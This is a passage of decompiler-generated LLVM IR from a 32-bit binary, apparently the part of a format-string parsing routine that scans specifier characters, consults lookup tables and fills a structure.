  %v0_8052153.pre.pre.pre = phi i32 [ %v1_8052118, %dec_label_pc_8052115 ], [ %v0_8052153.pre.pre.pre.pre, %dec_label_pc_8052109 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052125

dec_label_pc_8052125:                             ; preds = %dec_label_pc_80520ec, %dec_label_pc_8052120
  %v0_8052153.pre.pre = phi i32 [ %v1_8052118, %dec_label_pc_80520ec ], [ %v0_8052153.pre.pre.pre, %dec_label_pc_8052120 ]
  %v0_8051fbe = phi i32 [ %v0_805210f, %dec_label_pc_80520ec ], [ -2147483648, %dec_label_pc_8052120 ]
  %v4_8052125 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_8052125 = icmp eq i32 %v4_8052125, 0
  %v1_805212a = icmp eq i1 %v5_8052125, false
  %.pre = inttoptr i32 %v0_8052153.pre.pre to i8*
  br i1 %v1_805212a, label %dec_label_pc_805214e, label %dec_label_pc_8052130

dec_label_pc_8052130:                             ; preds = %dec_label_pc_8052125
  %v2_8052130 = load i8, i8* %.pre, align 1
  %v11_8052130 = icmp eq i8 %v2_8052130, 46
  %v1_8052133 = icmp eq i1 %v11_8052130, false
  br i1 %v1_8052133, label %dec_label_pc_8052147, label %dec_label_pc_8052135

dec_label_pc_8052135:                             ; preds = %dec_label_pc_8052130
  %v1_8052135 = add i32 %v0_8052153.pre.pre, 1
  store i32 %v1_8052135, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052018.outer

dec_label_pc_8052147:                             ; preds = %dec_label_pc_8052130
  br label %dec_label_pc_805214e

dec_label_pc_805214e:                             ; preds = %dec_label_pc_8052125, %dec_label_pc_8052147
  %stack_var_-96.2 = phi i32 [ %v0_8051fbe, %dec_label_pc_8052147 ], [ %stack_var_-96.1.ph, %dec_label_pc_8052125 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_8052147 ], [ %v0_8051fbe, %dec_label_pc_8052125 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8059cd8.477 to i32), i32* @edx, align 4
  %v4_8052153.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052153

dec_label_pc_8052153:                             ; preds = %dec_label_pc_805215d, %dec_label_pc_805214e
  %v0_805215d = phi i32 [ %v1_805215d, %dec_label_pc_805215d ], [ ptrtoint ([9 x i8]* @global_var_8059cd8.477 to i32), %dec_label_pc_805214e ]
  %v4_8052153 = phi i32 [ %v6_8052153, %dec_label_pc_805215d ], [ %v4_8052153.pre, %dec_label_pc_805214e ]
  %v2_8052153 = load i8, i8* %.pre, align 1
  %v3_8052153 = zext i8 %v2_8052153 to i32
  %v5_8052153 = and i32 %v4_8052153, -256
  %v6_8052153 = or i32 %v3_8052153, %v5_8052153
  store i32 %v6_8052153, i32* %eax.global-to-local, align 4
  %v3_8052155 = inttoptr i32 %v0_805215d to i8*
  %v4_8052155 = load i8, i8* %v3_8052155, align 1
  %v15_8052155 = icmp eq i8 %v2_8052153, %v4_8052155
  br i1 %v15_8052155, label %dec_label_pc_8051fc5, label %dec_label_pc_805215d

dec_label_pc_805215d:                             ; preds = %dec_label_pc_8052153
  %v1_805215d = add i32 %v0_805215d, 1
  store i32 %v1_805215d, i32* @edx, align 4
  %v1_805215e = inttoptr i32 %v1_805215d to i8*
  %v2_805215e = load i8, i8* %v1_805215e, align 1
  %v3_805215e = icmp eq i8 %v2_805215e, 0
  %v1_8052161 = icmp eq i1 %v3_805215e, false
  br i1 %v1_8052161, label %dec_label_pc_8052153, label %dec_label_pc_8052163

dec_label_pc_8052163:                             ; preds = %dec_label_pc_805215d, %dec_label_pc_8051fc5
  %v0_8052176 = phi i32 [ %v1_8051fc5, %dec_label_pc_8051fc5 ], [ %v0_8052153.pre.pre, %dec_label_pc_805215d ]
  %v0_8052173 = phi i32 [ %v0_805215d, %dec_label_pc_8051fc5 ], [ %v1_805215d, %dec_label_pc_805215d ]
  %v1_8052165 = add i32 %v0_8052173, -134585560
  %v1_805216a = add i32 %v0_8052173, -134585561
  %v5_805216a = sub i32 134585560, %v0_8052173
  %v6_805216a = and i32 %v1_8052165, %v5_805216a
  %v7_805216a = icmp slt i32 %v6_805216a, 0
  %v8_805216a = icmp eq i32 %v1_805216a, 0
  %v9_805216a = icmp slt i32 %v1_805216a, 0
  store i32 %v1_805216a, i32* %eax.global-to-local, align 4
  %v3_805216b = icmp eq i1 %v9_805216a, %v7_805216a
  %v4_805216b = icmp eq i1 %v8_805216a, false
  %v5_805216b = and i1 %v4_805216b, %v3_805216b
  br i1 %v5_805216b, label %dec_label_pc_8052177, label %dec_label_pc_805216d

dec_label_pc_805216d:                             ; preds = %dec_label_pc_8052163
  %v1_805216d = inttoptr i32 %v0_8052176 to i8*
  %v2_805216d = load i8, i8* %v1_805216d, align 1
  %v3_805216d = zext i8 %v2_805216d to i32
  %v5_805216d = and i32 %v1_805216a, -256
  %v6_805216d = or i32 %v3_805216d, %v5_805216d
  store i32 %v6_805216d, i32* %eax.global-to-local, align 4
  %v3_805216f = inttoptr i32 %v0_8052173 to i8*
  %v4_805216f = load i8, i8* %v3_805216f, align 1
  %v15_805216f = icmp eq i8 %v2_805216d, %v4_805216f
  %v1_8052171 = icmp eq i1 %v15_805216f, false
  br i1 %v1_8052171, label %dec_label_pc_8052177, label %dec_label_pc_8052173

dec_label_pc_8052173:                             ; preds = %dec_label_pc_805216d
  %v1_8052173 = add i32 %v0_8052173, 9
  store i32 %v1_8052173, i32* @edx, align 4
  %v1_8052176 = add i32 %v0_8052176, 1
  store i32 %v1_8052176, i32* @esi, align 4
  br label %dec_label_pc_8052177

dec_label_pc_8052177:                             ; preds = %dec_label_pc_805216d, %dec_label_pc_8052163, %dec_label_pc_8052173
  %v4_805217b = phi i32 [ %v6_805216d, %dec_label_pc_805216d ], [ %v1_805216a, %dec_label_pc_8052163 ], [ %v6_805216d, %dec_label_pc_8052173 ]
  %v0_805217b = phi i32 [ %v0_8052176, %dec_label_pc_805216d ], [ %v0_8052176, %dec_label_pc_8052163 ], [ %v1_8052176, %dec_label_pc_8052173 ]
  %v0_8052177 = phi i32 [ %v0_8052173, %dec_label_pc_805216d ], [ %v0_8052173, %dec_label_pc_8052163 ], [ %v1_8052173, %dec_label_pc_8052173 ]
  %v1_8052177 = add i32 %v0_8052177, 9
  %v2_8052177 = inttoptr i32 %v1_8052177 to i8*
  %v3_8052177 = load i8, i8* %v2_8052177, align 1
  %v4_8052177 = sext i8 %v3_8052177 to i32
  store i32 %v4_8052177, i32* %ebx.global-to-local, align 4
  %v1_805217b = inttoptr i32 %v0_805217b to i8*
  %v2_805217b = load i8, i8* %v1_805217b, align 1
  %v3_805217b = zext i8 %v2_805217b to i32
  %v5_805217b = and i32 %v4_805217b, -256
  %v6_805217b = or i32 %v3_805217b, %v5_805217b
  store i32 %v6_805217b, i32* %eax.global-to-local, align 4
  %v2_805217d = mul nsw i32 %v4_8052177, 256
  store i32 %v2_805217d, i32* %ebx.global-to-local, align 4
  %v4_8052180 = icmp eq i8 %v2_805217b, 0
  br i1 %v4_8052180, label %dec_label_pc_805233d, label %dec_label_pc_8052188

dec_label_pc_8052188:                             ; preds = %dec_label_pc_8052177
  %v3_8052188 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052188, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_8059d15.478 to i32), i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052191

dec_label_pc_8052191:                             ; preds = %dec_label_pc_80521e1, %dec_label_pc_8052188
  %v0_80521e1 = phi i32 [ %v1_80521e1, %dec_label_pc_80521e1 ], [ ptrtoint ([21 x i8]* @global_var_8059d15.478 to i32), %dec_label_pc_8052188 ]
  %v3_8052191 = inttoptr i32 %v0_80521e1 to i8*
  %v4_8052191 = load i8, i8* %v3_8052191, align 1
  %v15_8052191 = icmp eq i8 %v2_805217b, %v4_8052191
  %v1_8052193 = icmp eq i1 %v15_8052191, false
  br i1 %v1_8052193, label %dec_label_pc_80521e1, label %dec_label_pc_8052195

dec_label_pc_8052195:                             ; preds = %dec_label_pc_8052191
  %v1_8052197 = add i32 %v0_80521e1, -134585621
  store i32 %v1_8052197, i32* %edx.global-to-local, align 4
  %v7_80521a0 = icmp sgt i32 %v1_8052197, 17
  br i1 %v7_80521a0, label %dec_label_pc_80521a2, label %dec_label_pc_80521ab

dec_label_pc_80521a2:                             ; preds = %dec_label_pc_8052195
  %v1_80521a2 = add i32 %v0_80521e1, -134585623
  store i32 %v1_80521a2, i32* %eax.global-to-local, align 4
  %v3_80521a5 = and i32 %v2_805217d, 1024
  %v4_80521a5 = icmp eq i32 %v3_80521a5, 0
  %v1_80521a8 = icmp eq i1 %v4_80521a5, false
  %v4_80521a8 = select i1 %v1_80521a8, i32 %v1_80521a2, i32 %v1_8052197
  store i32 %v4_80521a8, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80521ab

dec_label_pc_80521ab:                             ; preds = %dec_label_pc_8052195, %dec_label_pc_80521a2
  %v0_80521b4 = phi i32 [ %v1_8052197, %dec_label_pc_8052195 ], [ %v4_80521a8, %dec_label_pc_80521a2 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8059d0b.479 to i32), i32* %ecx.global-to-local, align 4
  %v2_80521b4 = add i32 %tmp76, 32
  %v3_80521b4 = inttoptr i32 %v2_80521b4 to i32*
  store i32 %v0_80521b4, i32* %v3_80521b4, align 4
  %v0_80521b7.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_80521bb.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80521b7

dec_label_pc_80521b7:                             ; preds = %dec_label_pc_80521b7, %dec_label_pc_80521ab
  %v0_80521b7 = phi i32 [ %v1_80521b7, %dec_label_pc_80521b7 ], [ %v0_80521b7.pre, %dec_label_pc_80521ab ]
  %v1_80521b7 = add i32 %v0_80521b7, 1
  store i32 %v1_80521b7, i32* %ecx.global-to-local, align 4
  %v1_80521b8 = inttoptr i32 %v1_80521b7 to i8*
  %v2_80521b8 = load i8, i8* %v1_80521b8, align 1
  %v3_80521b8 = sext i8 %v2_80521b8 to i32
  store i32 %v3_80521b8, i32* %eax.global-to-local, align 4
  %v8_80521bd = icmp sgt i32 %v0_80521bb.pre, %v3_80521b8
  br i1 %v8_80521bd, label %dec_label_pc_80521b7, label %dec_label_pc_80521bf

dec_label_pc_80521bf:                             ; preds = %dec_label_pc_80521b7
  store i32 ptrtoint ([21 x i8]* @global_var_8059d15.478 to i32), i32* @ecx, align 4
  %v1_80521c6 = add i32 %v0_80521b7, -134585611
  store i32 %v1_80521c6, i32* %eax.global-to-local, align 4
  %v2_80521cb = add i32 %v0_80521b7, add (i32 ptrtoint (i32* @global_var_8059cfc.480 to i32), i32 -134585611)
  %v3_80521cb = add i32 %v2_80521cb, %v1_80521c6
  %v4_80521cb = inttoptr i32 %v3_80521cb to i16*
  %v5_80521cb = load i16, i16* %v4_80521cb, align 2
  %v6_80521cb = sext i16 %v5_80521cb to i32
  store i32 %v6_80521cb, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_80521c6, 2
  %v3_80521d3 = add i32 %factor, 134585580
  %v4_80521d3 = inttoptr i32 %v3_80521d3 to i16*
  %v5_80521d3 = load i16, i16* %v4_80521d3, align 2
  %v6_80521d3 = sext i16 %v5_80521d3 to i32
  store i32 %v6_80521d3, i32* %eax.global-to-local, align 4
  %v1_80521db = load i32, i32* %ebx.global-to-local, align 4
  %v2_80521db = or i32 %v1_80521db, %v6_80521cb
  %v2_80521dd = and i32 %v2_80521db, %v6_80521d3
  store i32 %v2_80521dd, i32* %edx.global-to-local, align 4
  %v0_80521ef.pre = load i32, i32* @esi, align 4
  %v0_80521f2.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80521e7

dec_label_pc_80521e1:                             ; preds = %dec_label_pc_8052191
  %v1_80521e1 = add i32 %v0_80521e1, 1
  store i32 %v1_80521e1, i32* @ecx, align 4
  %v1_80521e2 = inttoptr i32 %v1_80521e1 to i8*
  %v2_80521e2 = load i8, i8* %v1_80521e2, align 1
  %v3_80521e2 = icmp eq i8 %v2_80521e2, 0
  %v1_80521e5 = icmp eq i1 %v3_80521e2, false
  br i1 %v1_80521e5, label %dec_label_pc_8052191, label %dec_label_pc_80521e7

dec_label_pc_80521e7:                             ; preds = %dec_label_pc_80521e1, %dec_label_pc_80521bf
  %v0_80521f2 = phi i32 [ %v0_80521f2.pre, %dec_label_pc_80521bf ], [ %storemerge4, %dec_label_pc_80521e1 ]
  %v0_80521ef = phi i32 [ %v0_80521ef.pre, %dec_label_pc_80521bf ], [ %v0_805217b, %dec_label_pc_80521e1 ]
  %v0_80521e7 = phi i32 [ %v2_80521dd, %dec_label_pc_80521bf ], [ %v3_8052188, %dec_label_pc_80521e1 ]
  store i32 %v0_80521e7, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_80521ef = inttoptr i32 %v0_80521ef to i8*
  %v2_80521ef = load i8, i8* %v1_80521ef, align 1
  %v3_80521ef = sext i8 %v2_80521ef to i32
  store i32 %v3_80521ef, i32* %eax.global-to-local, align 4
  %v2_80521f2 = add i32 %tmp76, 4
  %v3_80521f2 = inttoptr i32 %v2_80521f2 to i32*
  store i32 %v0_80521f2, i32* %v3_80521f2, align 4
  %v0_80521f5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80521f5 = load i32, i32* @edx, align 4
  %v2_80521f5 = add i32 %v1_80521f5, 12
  %v3_80521f5 = inttoptr i32 %v2_80521f5 to i32*
  store i32 %v0_80521f5, i32* %v3_80521f5, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_80521fc = load i32, i32* @edx, align 4
  %v1_80521fc = add i32 %v0_80521fc, 28
  %v2_80521fc = inttoptr i32 %v1_80521fc to i32*
  store i32 1, i32* %v2_80521fc, align 4
  %v0_8052203 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052203 = load i32, i32* @edx, align 4
  %v2_8052203 = add i32 %v1_8052203, 8
  %v3_8052203 = inttoptr i32 %v2_8052203 to i32*
  store i32 %v0_8052203, i32* %v3_8052203, align 4
  %v0_8052206 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052210 = and i32 %v0_8052206, -5
  %v0_8052216 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052216 = and i32 %v0_8052216, 3840
  store i32 %v1_8052216, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_805221f = or i32 %v1_8052216, %v1_8052210
  store i32 %v2_805221f, i32* @edi, align 4
  %v1_8052221 = load i32, i32* @edx, align 4
  %v2_8052221 = add i32 %v1_8052221, 20
  %v3_8052221 = inttoptr i32 %v2_8052221 to i32*
  store i32 48, i32* %v3_8052221, align 4
  %v0_8052224 = load i32, i32* @edi, align 4
  %v1_8052224 = load i32, i32* @edx, align 4
  %v2_8052224 = add i32 %v1_8052224, 16
  %v3_8052224 = inttoptr i32 %v2_8052224 to i32*
  store i32 %v0_8052224, i32* %v3_8052224, align 4
  %v0_8052227 = load i32, i32* @ecx, align 4
  %v1_8052227 = inttoptr i32 %v0_8052227 to i8*
  %v2_8052227 = load i8, i8* %v1_8052227, align 1
  %v3_8052227 = icmp eq i8 %v2_8052227, 0
  %v1_805222a = icmp eq i1 %v3_8052227, false
  br i1 %v1_805222a, label %dec_label_pc_8052243, label %dec_label_pc_805222c

dec_label_pc_805222c:                             ; preds = %dec_label_pc_80521e7
  %v0_805222c = load i32, i32* @esi, align 4
  %v1_805222c = inttoptr i32 %v0_805222c to i8*
  %v2_805222c = load i8, i8* %v1_805222c, align 1
  %v11_805222c = icmp eq i8 %v2_805222c, 109
  %v1_805222f = icmp eq i1 %v11_805222c, false
  br i1 %v1_805222f, label %dec_label_pc_805233d, label %dec_label_pc_8052235

dec_label_pc_8052235:                             ; preds = %dec_label_pc_805222c
  %v0_8052235 = load i32, i32* @edx, align 4
  %v1_8052235 = add i32 %v0_8052235, 32
  %v2_8052235 = inttoptr i32 %v1_8052235 to i32*
  store i32 20, i32* %v2_8052235, align 4
  %v0_805223c = load i32, i32* @edx, align 4
  %v1_805223c = add i32 %v0_805223c, 28
  %v2_805223c = inttoptr i32 %v1_805223c to i32*
  store i32 0, i32* %v2_805223c, align 4
  br label %dec_label_pc_8052243

dec_label_pc_8052243:                             ; preds = %dec_label_pc_80521e7, %dec_label_pc_8052235
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_80522df, label %dec_label_pc_805224e

dec_label_pc_805224e:                             ; preds = %dec_label_pc_8052243
  store i32 0, i32* %ebp.global-to-local, align 4
  %v4_80522c7 = add i32 %tmp76, 40
  %v4_805225d = add i32 %tmp76, 36
  %v1_80522d0 = add i32 %tmp76, 28
  %v2_80522d0 = inttoptr i32 %v1_80522d0 to i32*
  br label %dec_label_pc_8052250

dec_label_pc_8052250:                             ; preds = %dec_label_pc_80522cb, %dec_label_pc_805224e
  %v0_8052266 = phi i32 [ 0, %dec_label_pc_805224e ], [ %v1_80522cf, %dec_label_pc_80522cb ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_805224e ], [ %stack_var_-88.5, %dec_label_pc_80522cb ]
  %v1_8052250 = add i32 %v0_8052266, -2
  %v6_8052250 = sub i32 1, %v0_8052266
  %v7_8052250 = and i32 %v6_8052250, %v0_8052266
  %v8_8052250 = icmp slt i32 %v7_8052250, 0
  %v9_8052250 = icmp eq i32 %v1_8052250, 0
  %v10_8052250 = icmp slt i32 %v1_8052250, 0
  %v3_8052253 = icmp eq i1 %v10_8052250, %v8_8052250
  %v4_8052253 = icmp eq i1 %v9_8052250, false
  %v5_8052253 = and i1 %v4_8052253, %v3_8052253
  br i1 %v5_8052253, label %dec_label_pc_8052266, label %dec_label_pc_8052255

dec_label_pc_8052255:                             ; preds = %dec_label_pc_8052250
  %v0_8052255 = load i32, i32* @esp, align 4
  %v2_8052255 = mul i32 %v0_8052266, 4
  %v3_8052255 = add i32 %v2_8052255, 68
  %v4_8052255 = add i32 %v3_8052255, %v0_8052255
  %v5_8052255 = inttoptr i32 %v4_8052255 to i32*
  %v6_8052255 = load i32, i32* %v5_8052255, align 4
  store i32 %v6_8052255, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_805225d = trunc i32 %v6_8052255 to i8
  %v5_805225d = add i32 %v4_805225d, %v0_8052266
  %v6_805225d = inttoptr i32 %v5_805225d to i8*
  store i8 %v1_805225d, i8* %v6_805225d, align 1
  %v0_8052261 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052261 = urem i32 %v0_8052261, 256
  br label %dec_label_pc_805226f

dec_label_pc_8052266:                             ; preds = %dec_label_pc_8052250
  %v5_8052268 = add i32 %v0_8052266, %stack_var_-32.3
  store i32 %v5_8052268, i32* %eax.global-to-local, align 4
  %v1_805226c = add i32 %v5_8052268, -2
  br label %dec_label_pc_805226f

dec_label_pc_805226f:                             ; preds = %dec_label_pc_8052255, %dec_label_pc_8052266
  %v0_8052282 = phi i32 [ %v1_8052261, %dec_label_pc_8052255 ], [ %v1_805226c, %dec_label_pc_8052266 ]
  store i32 %v0_8052282, i32* %eax.global-to-local, align 4
  %v5_805226f = sub i32 %v0_8052282, %stack_var_-88.4
  %v11_805226f = xor i32 %v0_8052282, %stack_var_-88.4
  %v12_805226f = xor i32 %v5_805226f, %v0_8052282
  %v13_805226f = and i32 %v12_805226f, %v11_805226f
  %v14_805226f = icmp slt i32 %v13_805226f, 0
  %v15_805226f = icmp eq i32 %v5_805226f, 0
  %v16_805226f = icmp slt i32 %v5_805226f, 0
  %v3_8052273 = icmp ne i1 %v16_805226f, %v14_805226f
  %v4_8052273 = or i1 %v15_805226f, %v3_8052273
  br i1 %v4_8052273, label %dec_label_pc_8052282, label %dec_label_pc_8052275

dec_label_pc_8052275:                             ; preds = %dec_label_pc_805226f
  %v1_8052275 = add i32 %v0_8052282, -9
  %v6_8052275 = sub i32 8, %v0_8052282
  %v7_8052275 = and i32 %v6_8052275, %v0_8052282
  %v8_8052275 = icmp slt i32 %v7_8052275, 0
  %v9_8052275 = icmp eq i32 %v1_8052275, 0
  %v10_8052275 = icmp slt i32 %v1_8052275, 0
  %v3_8052278 = icmp eq i1 %v10_8052275, %v8_8052275
  %v4_8052278 = icmp eq i1 %v9_8052275, false
  %v5_8052278 = and i1 %v4_8052278, %v3_8052278
  br i1 %v5_8052278, label %dec_label_pc_805233d, label %dec_label_pc_8052282

dec_label_pc_8052282:                             ; preds = %dec_label_pc_8052275, %dec_label_pc_805226f
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_805226f ], [ %v0_8052282, %dec_label_pc_8052275 ]
  %v1_8052282 = add i32 %v0_8052282, -1
  store i32 %v1_8052282, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_805228b = load i32, i32* @esp, align 4
  %v1_805228b = load i32, i32* %ebp.global-to-local, align 4
  %v2_805228b = mul i32 %v1_805228b, 4
  %v3_805228b = add i32 %v0_805228b, 80
  %v4_805228b = add i32 %v3_805228b, %v2_805228b
  %v5_805228b = inttoptr i32 %v4_805228b to i32*
  %v6_805228b = load i32, i32* %v5_805228b, align 4
  store i32 %v6_805228b, i32* %edi.global-to-local, align 4
  %v2_805228f = mul i32 %v1_8052282, 4
  %v4_805228f = add i32 %v4_80522c7, %v2_805228f
  %v5_805228f = inttoptr i32 %v4_805228f to i32*
  %v6_805228f = load i32, i32* %v5_805228f, align 4
  store i32 %v6_805228f, i32* @eax, align 4
  %v9_8052293 = icmp eq i32 %v6_805228b, 8
  br i1 %v9_8052293, label %dec_label_pc_80522cb, label %dec_label_pc_8052298

dec_label_pc_8052298:                             ; preds = %dec_label_pc_8052282
  %v9_8052298 = icmp eq i32 %v6_805228f, 8
  br i1 %v9_8052298, label %dec_label_pc_80522bb, label %dec_label_pc_805229d

dec_label_pc_805229d:                             ; preds = %dec_label_pc_8052298
  %v12_805229d = icmp eq i32 %v6_805228f, %v6_805228b
  br i1 %v12_805229d, label %dec_label_pc_80522bb, label %dec_label_pc_80522a1

dec_label_pc_80522a1:                             ; preds = %dec_label_pc_805229d
  %v1_80522a1 = call i32 @_promoted_size(i32 %v1_8052282)
  store i32 %v1_80522a1, i32* %ebx.global-to-local, align 4
  %v0_80522a8 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_80522a8, i32* @eax, align 4
  %v1_80522aa = call i32 @_promoted_size(i32 %v1_8052282)
  %v2_80522af = sub i32 %v1_80522a1, %v1_80522aa
  %v8_80522af = xor i32 %v1_80522a1, %v1_80522aa
  %v9_80522af = xor i32 %v2_80522af, %v1_80522a1
  %v10_80522af = and i32 %v9_80522af, %v8_80522af
  %v11_80522af = icmp slt i32 %v10_80522af, 0
  %v12_80522af = icmp eq i32 %v2_80522af, 0
  %v13_80522af = icmp slt i32 %v2_80522af, 0
  %v3_80522b1 = icmp ne i1 %v13_80522af, %v11_80522af
  %v4_80522b1 = or i1 %v12_80522af, %v3_80522b1
  %v5_80522b1 = zext i1 %v4_80522b1 to i32
  store i32 %v5_80522b1, i32* %eax.global-to-local, align 4
  %v1_80522b7 = icmp eq i1 %v4_80522b1, false
  br i1 %v1_80522b7, label %dec_label_pc_80522cb, label %dec_label_pc_80522a1.dec_label_pc_80522bb_crit_edge

dec_label_pc_80522a1.dec_label_pc_80522bb_crit_edge: ; preds = %dec_label_pc_80522a1
  %v0_80522bb.pre = load i32, i32* @esp, align 4
  %v1_80522bb.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80522bb

dec_label_pc_80522bb:                             ; preds = %dec_label_pc_80522a1.dec_label_pc_80522bb_crit_edge, %dec_label_pc_805229d, %dec_label_pc_8052298
  %v1_80522bb = phi i32 [ %v1_80522bb.pre, %dec_label_pc_80522a1.dec_label_pc_80522bb_crit_edge ], [ %v1_805228b, %dec_label_pc_805229d ], [ %v1_805228b, %dec_label_pc_8052298 ]
  %v0_80522bb = phi i32 [ %v0_80522bb.pre, %dec_label_pc_80522a1.dec_label_pc_80522bb_crit_edge ], [ %v0_805228b, %dec_label_pc_805229d ], [ %v0_805228b, %dec_label_pc_8052298 ]
  %v2_80522bb = mul i32 %v1_80522bb, 4
  %v3_80522bb = add i32 %v0_80522bb, 80
  %v4_80522bb = add i32 %v3_80522bb, %v2_80522bb
  %v5_80522bb = inttoptr i32 %v4_80522bb to i32*
  %v6_80522bb = load i32, i32* %v5_80522bb, align 4
  store i32 %v6_80522bb, i32* %eax.global-to-local, align 4
  store i32 %v1_8052282, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  store i32 %v6_80522bb, i32* %v5_805228f, align 4
  br label %dec_label_pc_80522cb

dec_label_pc_80522cb:                             ; preds = %dec_label_pc_80522a1, %dec_label_pc_8052282, %dec_label_pc_80522bb
  store i32 %tmp76, i32* @ecx, align 4
  %v0_80522cf = load i32, i32* %ebp.global-to-local, align 4
  %v1_80522cf = add i32 %v0_80522cf, 1
  store i32 %v1_80522cf, i32* %ebp.global-to-local, align 4
  %v3_80522d0 = load i32, i32* %v2_80522d0, align 4
  %v1_80522d3 = add i32 %v3_80522d0, 2
  store i32 %v1_80522d3, i32* %eax.global-to-local, align 4
  %v5_80522d8 = icmp slt i32 %v1_80522cf, %v1_80522d3
  br i1 %v5_80522d8, label %dec_label_pc_8052250, label %dec_label_pc_8052306

dec_label_pc_80522df:                             ; preds = %dec_label_pc_8052243
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_80522e3 = add i32 %tmp76, 38
  %v2_80522e3 = inttoptr i32 %v1_80522e3 to i8*
  store i8 1, i8* %v2_80522e3, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_80522ec = add i32 %tmp76, 28
  %v2_80522ec = inttoptr i32 %v1_80522ec to i32*
  %v3_80522ec = load i32, i32* %v2_80522ec, align 4
  %v2_80522ef = mul i32 %v3_80522ec, 4
  %v2_80522f3 = ptrtoint i32* %stack_var_-20 to i32
  %v1_80522fa = add i32 %tmp76, 40
  store i32 %v1_80522fa, i32* %eax.global-to-local, align 4
  %v3_80522fe = inttoptr i32 %v1_80522fa to i16*
  %v4_80522fe = call i32 @memcpy(i16* %v3_80522fe, i32 %v2_80522f3, i32 %v2_80522ef)
  store i32 %v4_80522fe, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052306

dec_label_pc_8052306:                             ; preds = %dec_label_pc_80522cb, %dec_label_pc_80522df
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_80522df ], [ %stack_var_-88.5, %dec_label_pc_80522cb ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  %v2_805230e = inttoptr i32 %v1_8051faf to i8*
  %v3_805230e = load i8, i8* %v2_805230e, align 1
  %v5_805230e = icmp slt i8 %v3_805230e, 0
  store i32 %stack_var_-88.6, i32* %v2_8051fa8, align 4
  br i1 %v5_805230e, label %dec_label_pc_805231e, label %dec_label_pc_8052317

dec_label_pc_8052317:                             ; preds = %dec_label_pc_8052306
  %v0_8052317 = load i32, i32* @esi, align 4
  %v1_8052317 = add i32 %v0_8052317, 1
  store i32 %v1_8052317, i32* %eax.global-to-local, align 4
  %v1_805231a = load i32, i32* @ecx, align 4
  %v2_805231a = inttoptr i32 %v1_805231a to i32*
  store i32 %v1_8052317, i32* %v2_805231a, align 4
  br label %dec_label_pc_8052331

dec_label_pc_805231e:                             ; preds = %dec_label_pc_8052306
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %v4_8051f7c, i32* %edx.global-to-local, align 4
  %v0_8052326 = load i32, i32* @esi, align 4
  %v2_8052326 = sub i32 %v0_8052326, %v4_8051f7c
  store i32 %v2_8052326, i32* %esi.global-to-local, align 4
  %v1_8052328 = mul i32 %v2_8052326, 4
  %v2_8052328 = add i32 %v1_8052328, 224
  store i32 %v2_8052328, i32* %eax.global-to-local, align 4
  %v2_805232f = load i32, i32* %arg1, align 4
  %v4_805232f = add i32 %v2_805232f, %v2_8052328
  store i32 %v4_805232f, i32* %arg1, align 4
  br label %dec_label_pc_8052331

dec_label_pc_8052331:                             ; preds = %dec_label_pc_8052317, %dec_label_pc_805231e
  store i32 %tmp76, i32* @edx, align 4
  %v1_8052335 = add i32 %tmp76, 28
  %v2_8052335 = inttoptr i32 %v1_8052335 to i32*
  %v3_8052335 = load i32, i32* %v2_8052335, align 4
  store i32 %v3_8052335, i32* %eax.global-to-local, align 4
  %v1_8052338 = add i32 %v3_8052335, 2
  br label %dec_label_pc_8052340

dec_label_pc_805233d:                             ; preds = %dec_label_pc_8051fcd, %dec_label_pc_8052067, %dec_label_pc_805209a, %dec_label_pc_8052115, %dec_label_pc_8052101, %dec_label_pc_80520f8, %dec_label_pc_8052275, %dec_label_pc_805222c, %dec_label_pc_8052177
  br label %dec_label_pc_8052340

dec_label_pc_8052340:                             ; preds = %dec_label_pc_8052331, %dec_label_pc_805233d
  %storemerge6 = phi i32 [ %v1_8052338, %dec_label_pc_8052331 ], [ -1, %dec_label_pc_805233d ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_8052343 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8052343, i32* @ebx, align 4
  store i32 %v0_8051f7b, i32* @esi, align 4
  store i32 %v0_8051f7a, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
